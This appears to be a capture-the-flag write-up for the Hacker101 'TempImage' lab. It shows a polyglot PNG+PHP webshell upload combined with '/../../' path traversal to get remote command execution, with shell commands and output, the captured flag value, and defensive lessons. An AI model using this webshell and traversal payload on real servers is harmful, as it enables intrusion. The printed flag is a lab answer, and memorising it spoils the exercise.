@@ -1,0 +1,76 @@
+================================
+LAB: TempImage - Flag 2
+================================
+
+[LAB INFORMATION]
+-----------------
+Date: 2026-02-26
+Lab URL: https://b9e49df19b20124e6211e3a23773c62b.ctf.hacker101.com
+Category: File Upload / Path Traversal / RCE
+Level: Moderate
+Objective: Achieve RCE via polyglot file upload + path traversal to read server-side source files
+Description: Same TempImage app. Combines magic bytes bypass with path traversal to land a PHP webshell outside the static /files/ directory, enabling arbitrary command execution.
+
+[RECONNAISSANCE]
+----------------
+From Flag 1 recon:
+- Upload stores files as /app/files/[md5hash]_[filename]
+- /files/ served statically by nginx -> PHP not executed there
+- filename field is unsanitized client-controlled hidden input
+- Server path confirmed: /app/ (from PHP error leaks)
+
+New finding:
+- filename=/../shell.php -> HTTP 302, file moved successfully
+  Location: files/[hash]_/../shell.php
+  Resolved path: /app/files/[hash]_/ -> invalid, 404
+- filename=/../../shell.php -> HTTP 302, file moved successfully
+  Resolved path: /app/files/[hash]_/../../shell.php -> /app/shell.php ✅
+  PHP executes files in /app/ -> webshell active
+
+[VULNERABILITY DISCOVERY]
+-------------------------
+1. filename field unsanitized -> path traversal possible
+2. Double traversal /../../ bypasses the hash prefix directory issue
+3. /app/ served by PHP-FPM -> .php files executed there
+4. Flag 2 hidden as PHP comment in /app/index.php, only readable via RCE
+
+[EXPLOITATION]
+--------------
+Step 1 - Upload polyglot PNG+PHP with double path traversal:
+  File content: [real PNG binary] + <?php system($_GET["cmd"]); ?>
+  name="file" filename="shell.php", Content-Type: image/png
+  name="filename" value: /../../shell.php
+  -> HTTP 302, shell lands at /app/shell.php
+
+Step 2 - Verify RCE:
+  GET /shell.php?cmd=id
+  -> uid=33(www-data) gid=33(www-data) groups=33(www-data) ✅
+
+Step 3 - List app directory:
+  GET /shell.php?cmd=ls+-la+/app/
+  -> index.php, doUpload.php, upload.php, files/, shell.php, php.ini, Dockerfile...
+
+Step 4 - Read source file containing flag:
+  GET /shell.php?cmd=cat+/app/index.php
+  -> Flag found in PHP comment on line 1
+
+Key payload (filename field):
+  /../../shell.php
+
+[EVIDENCE]
+----------
+RCE confirmation:
+  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+index.php content (truncated):
+  <?php /* ^FLAG^9a5c45190b55cc668b2c08d3762d6a398ccc87938c3d38f191a6d58ead3c29ff$FLAG$ */ ?>
+
+Flag: 9a5c45190b55cc668b2c08d3762d6a398ccc87938c3d38f191a6d58ead3c29ff
+
+[LESSONS LEARNED]
+-----------------
+- Double path traversal /../../ bypasses hash-prefixed filename concatenation
+- Directories served by PHP-FPM execute .php files; always isolate upload dirs
+- Polyglot files (PNG magic bytes + PHP payload) bypass getimagesize() checks
+- Sensitive data (flags, credentials, API keys) should never appear in source comments
+- nginx static serving of /files/ was not enough; upload dir must be outside webroot
